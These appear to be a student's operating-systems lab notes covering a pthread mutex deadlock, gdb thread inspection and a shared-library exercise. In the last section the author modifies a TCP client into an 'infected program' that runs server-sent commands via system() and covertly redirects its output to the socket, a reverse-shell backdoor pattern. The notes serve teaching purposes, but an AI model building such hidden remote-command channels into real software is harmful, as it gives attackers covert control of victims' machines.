# Lab 2

## Practise 1

> What is a barrier in this context?!?!?

The code is not a perfect lock, the first thread can finish the execution before
if the second is slower.
This will result in a lock for this program, but not for both threads.

Solution:

* Just added a sleep in the threads to sync them up

```
pthread_mutex_lock(&mtx[*param]);
sleep(1);
pthread_mutex_lock(&mtx[1-*param]);
```

## Practice 2

Compile:

```
gcc -O0 -g -o main deadlock.c -pthread
```

Flags:

* `-O0` is "optimisation level 0"
* `-g` (no sure) the symbols for debugger/debugging

Run the program with the debugger:

```
gdb ./main
```

Start the execution with the `gdb` command:

```
run
```

Use ^C (Ctrl + C) to stop the program, it will get stuck in a deadlock

`info thread` will give ass information about threads:

```
(gdb) info thread
  Id   Target Id                               Frame
* 1    Thread 0x7ffff7dca740 (LWP 4852) "main" 0x00007ffff7f97495 in __GI___pthread_timedjoin_ex (threadid=140737351816960, thread_return=0x0, abstime=0x0, block=<optimized out>)
    at pthread_join_common.c:89
  2    Thread 0x7ffff7dc9700 (LWP 4853) "main" __lll_lock_wait ()
    at ../sysdeps/unix/sysv/linux/x86_64/lowlevellock.S:103
  3    Thread 0x7ffff75c8700 (LWP 4854) "main" __lll_lock_wait ()
    at ../sysdeps/unix/sysv/linux/x86_64/lowlevellock.S:103
```

The `*`(start) indicate the current thread, the main thread, which is waiting
on `pthread_join()` function for the other threads.
The other threads are stuck in a`_lll_lock_wait()`

Using `thread <ID>` command can switch the context to another thread.

```
(gdb) thread 2
[Switching to thread 2 (Thread 0x7ffff7dc9700 (LWP 4853))]
#0  __lll_lock_wait () at ../sysdeps/unix/sysv/linux/x86_64/lowlevellock.S:103
103     ../sysdeps/unix/sysv/linux/x86_64/lowlevellock.S: No such file or directory.
```

Now `info stack` will give information about the stack...

```
(gdb) info stack
#0  __lll_lock_wait () at ../sysdeps/unix/sysv/linux/x86_64/lowlevellock.S:103
#1  0x00007ffff7f98714 in __GI___pthread_mutex_lock (mutex=0x5555555580a8 <mtx+40>)
    at ../nptl/pthread_mutex_lock.c:80
#2  0x00005555555551fe in ThrFunc (p=0x7fffffffe06c) at deadlock.c:14
#3  0x00007ffff7f95fa3 in start_thread (arg=<optimized out>) at pthread_create.c:486
#4  0x00007ffff7ec64cf in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
```

## Practice 3

Compile the library and the main program:

```
gcc library.c -shared -fPIC -o library.so
gcc main.c -o main -ldl
```

In the `client-server` folder are some programs for a tcp server and a client
that are exchanging simple messages.

As a **experimented modern programer** I'll just copy the code for the client
and modify it to execute the messages from server:

```
	bzero(buff, sizeof(buff)); 
	strcpy(buff, "empty\n");
	write(sockfd, buff, sizeof(buff)); 
    for (;;) { 
        bzero(buff, sizeof(buff)); 
        read(sockfd, buff, sizeof(buff)); 
        if ((strncmp(buff, "exit", 4)) == 0) { 
            printf("Client Exit...\n"); 
            break; 
        } 
		system(buff);
    } 
```

A little trick with file descriptors on linux allow for easy redirecting the output
to the server. So when we send `ls` from server the output will came back to server
and will not be displayed on the "client"/"infected program"

`dup2` will do the job perfectly. Here we save the `sdtout` file descriptor to
set it back later and redirect `stdout` ( fd = 1 ) and `stderr` ( fd = 2 ) to
`sockfd` (server).

```
	// save the stdout for later
	if(dup2(fileno(stdout), old_stdout) == -1) {
		perror("dup2 save stdout");
		exit(1);
	}

	// replace stdout wit sockfd
	if(dup2(sockfd, 1) == -1) {
		perror("dup2 sockfd");
		exit(1);
	}
	// replace stderr with sockfd
	if(dup2(sockfd, 2) == -1) {
		perror("dup2 sockfd");
		exit(1);
	}
```

Now will set the `stdout` and `stderr` back:

```
	// put stdout back and hope nobady observed
	if(dup2(old_stdout, 1) == -1) {
		perror("dup2 set back stdout");
		exit(1);
	}
	if(dup2(old_stderr, 2) == -1) {
		perror("dup2 set back stderr");
		exit(1);
	}
	printf("stdout back to normal\n");
	fprintf(stderr, "stderr back to normal\n");
```
